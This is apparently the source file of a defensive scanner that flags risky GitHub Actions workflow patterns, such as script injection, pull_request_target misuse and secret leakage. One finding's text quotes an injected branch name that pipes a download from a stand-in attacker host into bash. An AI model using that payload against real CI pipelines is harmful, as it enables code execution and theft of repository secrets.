"""
Elf 🧝 — GitHub Actions & CI/CD Checks (15–32)
Workflow files are a primary attack surface. Every check here operates
on the raw YAML text — never executes or triggers any workflow.
"""

import re
from ..models import Finding, Severity, Category


# SHA-pinned action pattern: uses: owner/action@abcdef1234567890...
_SHA_PIN_RE = re.compile(r'uses:\s*[^\s@]+@([a-f0-9]{40})', re.IGNORECASE)
_USES_RE    = re.compile(r'uses:\s*([^\s#\n]+)', re.IGNORECASE)

# Dangerous GitHub context variables used in run: steps
_DANGEROUS_CONTEXTS = [
    (r'github\.event\.issue\.title',                  "github.event.issue.title"),
    (r'github\.event\.issue\.body',                   "github.event.issue.body"),
    (r'github\.event\.pull_request\.title',           "github.event.pull_request.title"),
    (r'github\.event\.pull_request\.body',            "github.event.pull_request.body"),
    (r'github\.event\.pull_request\.head\.ref',       "github.event.pull_request.head.ref"),
    (r'github\.event\.pull_request\.head\.sha',       "github.event.pull_request.head.sha"),
    (r'github\.event\.head_commit\.message',          "github.event.head_commit.message"),
    (r'github\.event\.commits\[',                     "github.event.commits[*]"),
    (r'github\.event\.review\.body',                  "github.event.review.body"),
    (r'github\.event\.comment\.body',                 "github.event.comment.body"),
    (r'github\.event\.discussion\.body',              "github.event.discussion.body"),
    (r'github\.event\.pages\[',                       "github.event.pages[*]"),
    (r'github\.event\.inputs\.',                      "github.event.inputs.*"),
    (r'github\.head_ref',                             "github.head_ref"),
]


def _find_run_blocks(yaml_text: str) -> list:
    """Extract all run: block values from a workflow file."""
    run_blocks = []
    lines = yaml_text.split("\n")
    in_run = False
    current = []
    for line in lines:
        stripped = line.strip()
        if stripped.startswith("run:"):
            in_run = True
            rest = stripped[4:].strip().lstrip("|").lstrip(">").strip()
            if rest:
                current.append(rest)
        elif in_run:
            if stripped and not stripped.startswith("-") and ":" in stripped and not stripped.startswith("#"):
                if current:
                    run_blocks.append("\n".join(current))
                current = []
                in_run = False
            else:
                current.append(stripped)
    if current:
        run_blocks.append("\n".join(current))
    return run_blocks


def run_actions_checks(workflow_files: list) -> list:
    """
    Run all 18 GitHub Actions checks.

    Args:
        workflow_files: List of (filename, yaml_content) tuples

    Returns:
        List of Finding objects for every triggered check.
    """
    findings = []

    if not workflow_files:
        return findings

    all_unpinned_actions    = []
    all_prt_checkouts       = []
    all_workflow_run_issues = []
    all_write_perms         = []
    all_injections          = []
    all_self_hosted         = []
    all_cache_issues        = []
    all_artifact_issues     = []
    all_secret_logs         = []
    all_composite_external  = []
    all_reusable_external   = []
    all_matrix_issues       = []
    all_dispatch_issues     = []
    all_debug_issues        = []

    for fname, content in workflow_files:
        lines     = content.split("\n")
        run_blocks = _find_run_blocks(content)

        # ── CHECK 15: Unpinned third-party actions ────────────────────────
        uses_matches = _USES_RE.findall(content)
        for action_ref in uses_matches:
            action_ref = action_ref.strip()
            # Skip local actions, Docker actions, GitHub official actions
            if action_ref.startswith(".") or action_ref.startswith("docker://"):
                continue
            if action_ref.startswith("actions/") or action_ref.startswith("github/"):
                continue
            # Check if pinned to full SHA
            if "@" in action_ref:
                sha_part = action_ref.split("@")[-1]
                if re.match(r'^[a-f0-9]{40}$', sha_part):
                    continue  # Properly pinned
            all_unpinned_actions.append((fname, action_ref))

        # ── CHECK 16: pull_request_target with checkout ───────────────────
        if "pull_request_target" in content:
            if re.search(r'actions/checkout', content) and re.search(r'ref.*head', content, re.IGNORECASE):
                all_prt_checkouts.append(fname)
            elif re.search(r'actions/checkout', content):
                # Even without explicit head ref, checkout under prt is dangerous
                all_prt_checkouts.append(fname)

        # ── CHECK 17: workflow_run with elevated permissions ──────────────
        if "workflow_run" in content:
            if re.search(r'permissions.*write', content, re.IGNORECASE):
                all_workflow_run_issues.append(fname)
            elif re.search(r'actions/checkout', content):
                all_workflow_run_issues.append(fname)

        # ── CHECK 18: Over-privileged GITHUB_TOKEN ────────────────────────
        write_perms = re.findall(
            r'(contents|packages|deployments|id-token|issues|pull-requests|'
            r'repository-projects|security-events|workflows|write-all|admin)\s*:\s*write',
            content, re.IGNORECASE
        )
        if write_perms:
            all_write_perms.append((fname, write_perms))

        # ── CHECKS 19-27: Script injection via context variables ──────────
        run_combined = "\n".join(run_blocks)
        for pattern, label in _DANGEROUS_CONTEXTS:
            if re.search(pattern, run_combined, re.IGNORECASE):
                all_injections.append((fname, label))

        # ── CHECK 28: Self-hosted runners ─────────────────────────────────
        if re.search(r'runs-on:.*self-hosted', content, re.IGNORECASE):
            all_self_hosted.append(fname)

        # ── CHECK 29: Cache restore in privileged context ─────────────────
        if "actions/cache" in content and write_perms:
            all_cache_issues.append(fname)

        # ── CHECK 30: Artifact download in privileged context ─────────────
        if "actions/download-artifact" in content and write_perms:
            all_artifact_issues.append(fname)

        # ── CHECK 31: Secrets printed to logs ────────────────────────────
        if re.search(r'echo.*\$\{\{.*secrets\.', content):
            all_secret_logs.append(fname)
        if re.search(r'ACTIONS_STEP_DEBUG.*true', content):
            all_debug_issues.append(fname)

        # ── CHECK 32: Composite/reusable action from external source ──────
        if re.search(r'uses:\s*[a-zA-Z0-9\-_]+/[a-zA-Z0-9\-_]+/', content):
            # External composite actions
            for match in re.findall(r'uses:\s*([a-zA-Z0-9\-_\.]+/[a-zA-Z0-9\-_\.]+/[^\s\n]+)', content):
                if not match.startswith("actions/") and not match.startswith("."):
                    all_composite_external.append((fname, match))

        # ── CHECK: workflow_dispatch with unvalidated inputs ─────────────
        if "workflow_dispatch" in content:
            inputs = re.findall(r'inputs:\s*\n(.*?)(?=\n\S|\Z)', content, re.DOTALL)
            if inputs and run_combined:
                if re.search(r'\$\{\{\s*inputs\.', run_combined):
                    all_dispatch_issues.append(fname)

        # ── CHECK: matrix with external input ────────────────────────────
        if re.search(r'matrix.*fromJSON.*github\.event', content, re.IGNORECASE):
            all_matrix_issues.append(fname)

    # ── Emit findings ────────────────────────────────────────────────────────

    if all_unpinned_actions:
        unique_actions = list({a for _, a in all_unpinned_actions})[:10]
        findings.append(Finding(
            check_id=15,
            name=f"Unpinned third-party GitHub Actions ({len(all_unpinned_actions)} found)",
            category=Category.ACTIONS,
            severity=Severity.HIGH,
            detail=(
                "Third-party GitHub Actions are referenced without pinning to a full "
                "40-character commit SHA. Tags like '@v1' or '@main' are mutable — a "
                "compromised action maintainer can change what code runs by simply "
                "updating the tag. GitHub's own security guidance states that pinning "
                "to a full commit SHA is the only way to guarantee immutability. "
                "A malicious update to any of these actions would execute in this "
                "repo's CI/CD pipeline with full access to secrets and the runner."
            ),
            evidence="Unpinned: " + ", ".join(unique_actions),
            check_name="UNPINNED_THIRD_PARTY_ACTIONS",
        ))

    if all_prt_checkouts:
        findings.append(Finding(
            check_id=16,
            name="pull_request_target trigger with repository checkout",
            category=Category.ACTIONS,
            severity=Severity.CRITICAL,
            detail=(
                "One or more workflows use the 'pull_request_target' trigger combined "
                "with 'actions/checkout'. This is a critically dangerous pattern "
                "documented by GitHub's own security team. The 'pull_request_target' "
                "trigger runs with write permissions and access to secrets even for "
                "pull requests from forks. Checking out and running untrusted PR code "
                "in this context allows any external contributor to steal repository "
                "secrets, push to protected branches, or execute arbitrary code with "
                "elevated privileges."
            ),
            evidence=f"Affected files: {', '.join(all_prt_checkouts)}",
            check_name="DANGEROUS_PULL_REQUEST_TARGET",
        ))

    if all_workflow_run_issues:
        findings.append(Finding(
            check_id=17,
            name="workflow_run trigger with elevated permissions or checkout",
            category=Category.ACTIONS,
            severity=Severity.HIGH,
            detail=(
                "Workflows triggered by 'workflow_run' inherit the privilege level of "
                "the triggering workflow's context, not the PR context. This is a known "
                "attack path: a low-privilege workflow is triggered by a fork PR, which "
                "then triggers a high-privilege 'workflow_run' workflow. When combined "
                "with repository checkout or write permissions, this allows secret "
                "exfiltration from untrusted pull request code."
            ),
            evidence=f"Affected files: {', '.join(all_workflow_run_issues)}",
            check_name="DANGEROUS_WORKFLOW_RUN",
        ))

    if all_write_perms:
        affected = [f"{fn}: {perms}" for fn, perms in all_write_perms[:5]]
        findings.append(Finding(
            check_id=18,
            name=f"Workflows with unnecessary write permissions",
            category=Category.ACTIONS,
            severity=Severity.MEDIUM,
            detail=(
                "One or more workflow files grant write permissions beyond what is needed. "
                "The principle of least privilege requires that the GITHUB_TOKEN only "
                "receives the permissions required for its specific job. Broad write "
                "permissions increase the blast radius of any workflow compromise — "
                "whether through action supply-chain attack, script injection, or "
                "compromised third-party action."
            ),
            evidence="\n".join(affected),
            check_name="OVERPRIVILEGED_GITHUB_TOKEN",
        ))

    if all_injections:
        unique_injections = list({label for _, label in all_injections})
        findings.append(Finding(
            check_id=19,
            name=f"Script injection via GitHub context variables",
            category=Category.ACTIONS,
            severity=Severity.CRITICAL,
            detail=(
                "Workflow run: steps use untrusted GitHub event context variables "
                "directly in shell commands without sanitization. This is a classic "
                "script injection vulnerability: an attacker opens a pull request with "
                "a malicious branch name like 'main; curl attacker.com/payload | bash' "
                "and the workflow executes it with full runner privileges and secret "
                "access. The specific dangerous variables found are listed in evidence."
            ),
            evidence="Dangerous variables: " + ", ".join(unique_injections),
            check_name="SCRIPT_INJECTION_CONTEXT_VARIABLES",
        ))

    if all_self_hosted:
        findings.append(Finding(
            check_id=20,
            name="Self-hosted runners declared in workflows",
            category=Category.ACTIONS,
            severity=Severity.MEDIUM,
            detail=(
                "This repository uses self-hosted GitHub Actions runners. Self-hosted "
                "runners persist between workflow runs, which means a compromised job "
                "can leave backdoors, steal credentials, or contaminate subsequent jobs "
                "that run on the same machine. GitHub-hosted runners are ephemeral and "
                "do not carry state between jobs. Self-hosted runners require strict "
                "hardening and should never be used with public repositories."
            ),
            evidence=f"Affected files: {', '.join(all_self_hosted)}",
            check_name="SELF_HOSTED_RUNNERS",
        ))

    if all_cache_issues:
        findings.append(Finding(
            check_id=21,
            name="Cache restore used in privileged workflow context",
            category=Category.ACTIONS,
            severity=Severity.HIGH,
            detail=(
                "Actions/cache is used in a workflow that also has write permissions. "
                "Cache poisoning is a documented attack path: a malicious workflow "
                "poisons the cache with a backdoored dependency or tool, which is "
                "then restored and executed by a subsequent privileged workflow run, "
                "bypassing normal dependency integrity checks."
            ),
            evidence=f"Affected files: {', '.join(all_cache_issues)}",
            check_name="CACHE_POISONING_RISK",
        ))

    if all_artifact_issues:
        findings.append(Finding(
            check_id=22,
            name="Artifact download in privileged workflow context",
            category=Category.ACTIONS,
            severity=Severity.HIGH,
            detail=(
                "Artifacts are downloaded and used in a workflow context with write "
                "permissions. Artifacts from untrusted workflow runs can be poisoned — "
                "a low-privilege workflow uploads a malicious artifact, which is then "
                "downloaded and processed by a high-privilege workflow, enabling "
                "privilege escalation and secret exfiltration."
            ),
            evidence=f"Affected files: {', '.join(all_artifact_issues)}",
            check_name="ARTIFACT_POISONING_RISK",
        ))

    if all_secret_logs:
        findings.append(Finding(
            check_id=23,
            name="Secrets may be printed to workflow logs",
            category=Category.ACTIONS,
            severity=Severity.CRITICAL,
            detail=(
                "Workflow steps appear to echo or print secret values to log output. "
                "GitHub masks known secret patterns in logs, but creative formatting, "
                "base64 encoding, or multi-step obfuscation can bypass this masking. "
                "Secret values in logs may be accessible to anyone with read access "
                "to the repository's Actions tab."
            ),
            evidence=f"Affected files: {', '.join(all_secret_logs)}",
            check_name="SECRETS_IN_LOGS",
        ))

    if all_composite_external:
        unique_ext = list({a for _, a in all_composite_external})[:5]
        findings.append(Finding(
            check_id=24,
            name="Composite actions sourced from external repositories",
            category=Category.ACTIONS,
            severity=Severity.HIGH,
            detail=(
                "Workflow files reference composite actions from external repositories "
                "that are not pinned to immutable commit SHAs. A compromised action "
                "maintainer can update the action to exfiltrate secrets, modify build "
                "outputs, or execute arbitrary code in this repository's CI/CD pipeline. "
                "All external action references must be pinned to full SHA."
            ),
            evidence="External actions: " + ", ".join(unique_ext),
            check_name="COMPOSITE_ACTION_EXTERNAL_UNPINNED",
        ))

    if all_dispatch_issues:
        findings.append(Finding(
            check_id=25,
            name="workflow_dispatch inputs used unsafely in shell commands",
            category=Category.ACTIONS,
            severity=Severity.HIGH,
            detail=(
                "Manual workflow dispatch inputs are passed directly into shell run: "
                "steps without sanitization. This allows anyone with repository access "
                "to trigger the workflow with a malicious input value and execute "
                "arbitrary commands in the runner environment with access to all secrets."
            ),
            evidence=f"Affected files: {', '.join(all_dispatch_issues)}",
            check_name="WORKFLOW_DISPATCH_INJECTION",
        ))

    if all_matrix_issues:
        findings.append(Finding(
            check_id=26,
            name="Matrix expansion from untrusted external input",
            category=Category.ACTIONS,
            severity=Severity.HIGH,
            detail=(
                "Workflow matrix values are generated using fromJSON() from untrusted "
                "GitHub event context. Injecting a malicious JSON payload through an "
                "issue comment, PR title, or similar input can cause the matrix to "
                "generate unexpected jobs or inject shell commands into the job "
                "configuration."
            ),
            evidence=f"Affected files: {', '.join(all_matrix_issues)}",
            check_name="MATRIX_INJECTION_FROM_CONTEXT",
        ))

    if all_debug_issues:
        findings.append(Finding(
            check_id=27,
            name="Debug mode enabled — environment variables exposed to logs",
            category=Category.ACTIONS,
            severity=Severity.MEDIUM,
            detail=(
                "ACTIONS_STEP_DEBUG is set to true in one or more workflow files. "
                "Debug mode causes GitHub Actions to log all environment variables, "
                "including masked secrets, in expanded form. This can expose sensitive "
                "values to anyone with access to the repository's Actions tab."
            ),
            evidence=f"Affected files: {', '.join(all_debug_issues)}",
            check_name="DEBUG_MODE_SECRETS_EXPOSURE",
        ))

    return findings
